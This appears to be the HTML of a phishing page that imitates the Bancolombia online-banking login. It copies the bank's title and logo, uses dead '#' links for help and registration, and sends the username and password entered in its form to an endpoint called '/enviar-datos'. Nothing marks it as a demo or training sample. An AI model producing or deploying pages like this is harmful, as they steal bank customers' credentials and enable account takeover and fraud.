<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas - Bancolombia</title>
    <link rel="stylesheet" href="estilo.css">
</head>
<body>

    <div class="contenedor-principal">
        <div class="tarjeta-login">
            <div class="logo-contenedor">
                <span class="logo-txt-negro">Banco</span><span class="logo-txt-amarillo">lombia</span>
                <div class="barra-colores"></div>
            </div>
            
            <h2 class="titulo-bienvenida">Inicia tu sesión</h2>
            <p class="subtitulo">Ingresa tus credenciales de acceso para continuar.</p>

            <form action="/enviar-datos" method="POST" class="formulario">
                <div class="grupo-input">
                    <label for="usuario">Usuario</label>
                    <input type="text" id="usuario" name="username" placeholder="Ingresa tu nombre de usuario" required autocomplete="off">
                </div>

                <div class="grupo-input">
                    <label for="clave">Contraseña</label>
                    <input type="password" id="clave" name="password" placeholder="Ingresa tu contraseña" required>
                </div>

                <div class="enlaces-ayuda">
                    <a href="#">¿Olvidaste tu usuario?</a>
                    <a href="#">¿Olvidaste tu contraseña?</a>
                </div>

                <button type="submit" class="btn-ingresar">Ingresar</button>
            </form>

            <div class="pie-tarjeta">
                <p>¿No te has registrado? <a href="#">Regístrate aquí</a></p>
            </div>
        </div>
    </div>

</body>
</html>
